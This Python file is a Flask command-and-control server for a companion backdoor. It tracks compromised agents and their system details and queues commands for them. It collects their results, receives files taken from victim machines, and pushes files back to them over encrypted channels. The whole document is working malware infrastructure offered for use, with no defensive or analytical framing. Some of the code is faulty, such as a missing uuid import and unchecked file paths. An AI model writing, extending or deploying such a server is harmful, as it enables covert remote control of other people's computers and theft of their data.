#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Flask C2 Server for backdoor.py
- Handles agent check-ins, tasks, and results
- Provides a web interface for managing agents
- Uses SQLite for data storage
- AES encryption compatible with backdoor.py
"""

import os
import json
import base64
import sqlite3
import logging
from datetime import datetime
from flask import Flask, request, jsonify, render_template
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC

app = Flask(__name__)

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s [%(levelname)s] %(message)s',
    handlers=[
        logging.FileHandler('c2_server.log'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

# SQLite database setup
DB_PATH = 'c2_database.db'

def init_db():
    """Initialize SQLite database"""
    with sqlite3.connect(DB_PATH) as conn:
        c = conn.cursor()
        c.execute('''CREATE TABLE IF NOT EXISTS agents (
            agent_id TEXT PRIMARY KEY,
            system_info TEXT,
            last_checkin TEXT
        )''')
        c.execute('''CREATE TABLE IF NOT EXISTS tasks (
            task_id TEXT PRIMARY KEY,
            agent_id TEXT,
            task_type TEXT,
            task_data TEXT,
            status TEXT,
            result TEXT,
            timestamp TEXT
        )''')
        conn.commit()

def generate_encryption_key(agent_id):
    """Generate AES encryption key compatible with backdoor.py"""
    try:
        salt = b'salt_'
        kdf = PBKDF2HMAC(
            algorithm=hashes.SHA256(),
            length=32,
            salt=salt,
            iterations=100000,
        )
        key = base64.urlsafe_b64encode(kdf.derive(agent_id.encode()))
        return key
    except Exception as e:
        logger.error(f"Encryption key generation error for agent {agent_id}: {e}")
        return Fernet.generate_key()

def encrypt_data(data, agent_id):
    """Encrypt data using AES"""
    try:
        cipher = Fernet(generate_encryption_key(agent_id))
        return cipher.encrypt(json.dumps(data).encode()).decode()
    except Exception as e:
        logger.error(f"Encryption error for agent {agent_id}: {e}")
        return json.dumps(data)

def decrypt_data(encrypted_data, agent_id):
    """Decrypt data using AES"""
    try:
        cipher = Fernet(generate_encryption_key(agent_id))
        return json.loads(cipher.decrypt(encrypted_data.encode()).decode())
    except Exception as e:
        logger.error(f"Decryption error for agent {agent_id}: {e}")
        return {}

@app.route('/')
def index():
    """Render web interface"""
    with sqlite3.connect(DB_PATH) as conn:
        c = conn.cursor()
        c.execute('SELECT agent_id, system_info, last_checkin FROM agents')
        agents = c.fetchall()
        c.execute('SELECT task_id, agent_id, task_type, task_data, status, result, timestamp FROM tasks ORDER BY timestamp DESC')
        tasks = c.fetchall()
    return render_template('index.html', agents=agents, tasks=tasks)

@app.route('/api/checkin', methods=['POST'])
def checkin():
    """Handle agent check-in"""
    try:
        data = request.json.get('data')
        if not data:
            return jsonify({'error': 'No data provided'}), 400
        
        # Decrypt data
        decrypted_data = decrypt_data(data, request.json.get('agent_id', 'unknown'))
        agent_id = decrypted_data.get('agent_id')
        if not agent_id:
            return jsonify({'error': 'Invalid agent_id'}), 400
        
        # Store agent info
        with sqlite3.connect(DB_PATH) as conn:
            c = conn.cursor()
            c.execute('INSERT OR REPLACE INTO agents (agent_id, system_info, last_checkin) VALUES (?, ?, ?)',
                     (agent_id, json.dumps(decrypted_data), datetime.now().isoformat()))
            conn.commit()
        
        logger.info(f"Agent {agent_id} checked in")
        return jsonify({'status': 'success'}), 200
    except Exception as e:
        logger.error(f"Check-in error: {e}")
        return jsonify({'error': str(e)}), 500

@app.route('/api/tasks', methods=['GET'])
def get_tasks():
    """Return tasks for agent"""
    try:
        agent_id = request.args.get('agent_id')
        if not agent_id:
            return jsonify({'error': 'No agent_id provided'}), 400
        
        with sqlite3.connect(DB_PATH) as conn:
            c = conn.cursor()
            c.execute('SELECT task_id, task_type, task_data FROM tasks WHERE agent_id = ? AND status = ?',
                     (agent_id, 'pending'))
            tasks = [{'id': row[0], 'type': row[1], 'data': json.loads(row[2])} for row in c.fetchall()]
        
        encrypted_tasks = [encrypt_data(task, agent_id) for task in tasks]
        return jsonify({'tasks': encrypted_tasks}), 200
    except Exception as e:
        logger.error(f"Get tasks error: {e}")
        return jsonify({'error': str(e)}), 500

@app.route('/api/results', methods=['POST'])
def receive_results():
    """Receive task results from agent"""
    try:
        data = request.json.get('data')
        if not data:
            return jsonify({'error': 'No data provided'}), 400
        
        decrypted_data = decrypt_data(data, request.json.get('agent_id', 'unknown'))
        task_id = decrypted_data.get('task_id')
        agent_id = decrypted_data.get('agent_id')
        result = decrypted_data.get('result')
        
        if not task_id or not agent_id:
            return jsonify({'error': 'Invalid task_id or agent_id'}), 400
        
        with sqlite3.connect(DB_PATH) as conn:
            c = conn.cursor()
            c.execute('UPDATE tasks SET status = ?, result = ? WHERE task_id = ?',
                     ('completed', json.dumps(result), task_id))
            conn.commit()
        
        logger.info(f"Received result for task {task_id} from agent {agent_id}")
        return jsonify({'status': 'success'}), 200
    except Exception as e:
        logger.error(f"Receive results error: {e}")
        return jsonify({'error': str(e)}), 500

@app.route('/api/upload', methods=['POST'])
def upload_file():
    """Receive file from agent"""
    try:
        data = request.json.get('data')
        if not data:
            return jsonify({'error': 'No data provided'}), 400
        
        decrypted_data = decrypt_data(data, request.json.get('agent_id', 'unknown'))
        agent_id = decrypted_data.get('agent_id')
        filename = decrypted_data.get('filename')
        content = decrypted_data.get('content')
        
        if not agent_id or not filename or not content:
            return jsonify({'error': 'Invalid upload data'}), 400
        
        # Save file
        upload_dir = os.path.join('uploads', agent_id)
        os.makedirs(upload_dir, exist_ok=True)
        with open(os.path.join(upload_dir, filename), 'wb') as f:
            f.write(base64.b64decode(content))
        
        logger.info(f"File {filename} uploaded from agent {agent_id}")
        return jsonify({'status': 'success'}), 200
    except Exception as e:
        logger.error(f"Upload error: {e}")
        return jsonify({'error': str(e)}), 500

@app.route('/api/download', methods=['POST'])
def download_file():
    """Send file to agent"""
    try:
        data = request.json.get('data')
        if not data:
            return jsonify({'error': 'No data provided'}), 400
        
        decrypted_data = decrypt_data(data, request.json.get('agent_id', 'unknown'))
        agent_id = decrypted_data.get('agent_id')
        file_path = decrypted_data.get('path')
        
        if not os.path.exists(file_path):
            return jsonify({'error': 'File not found'}), 404
        
        with open(file_path, 'rb') as f:
            content = base64.b64encode(f.read()).decode()
        
        response = {
            'filename': os.path.basename(file_path),
            'content': content
        }
        encrypted_response = encrypt_data(response, agent_id)
        logger.info(f"File {file_path} sent to agent {agent_id}")
        return jsonify({'data': encrypted_response}), 200
    except Exception as e:
        logger.error(f"Download error: {e}")
        return jsonify({'error': str(e)}), 500

@app.route('/api/add_task', methods=['POST'])
def add_task():
    """Add a new task for an agent (called from web interface)"""
    try:
        agent_id = request.form.get('agent_id')
        task_type = request.form.get('task_type')
        task_data = request.form.get('task_data')
        
        if not agent_id or not task_type or not task_data:
            return jsonify({'error': 'Missing required fields'}), 400
        
        task_id = str(uuid.uuid4())
        task_data_json = json.loads(task_data) if task_data else {}
        
        with sqlite3.connect(DB_PATH) as conn:
            c = conn.cursor()
            c.execute('INSERT INTO tasks (task_id, agent_id, task_type, task_data, status, timestamp) VALUES (?, ?, ?, ?, ?, ?)',
                     (task_id, agent_id, task_type, json.dumps(task_data_json), 'pending', datetime.now().isoformat()))
            conn.commit()
        
        logger.info(f"Task {task_id} added for agent {agent_id}: {task_type}")
        return jsonify({'status': 'success', 'task_id': task_id}), 200
    except Exception as e:
        logger.error(f"Add task error: {e}")
        return jsonify({'error': str(e)}), 500

if __name__ == '__main__':
    init_db()
    app.run(host='0.0.0.0', port=5000, debug=False)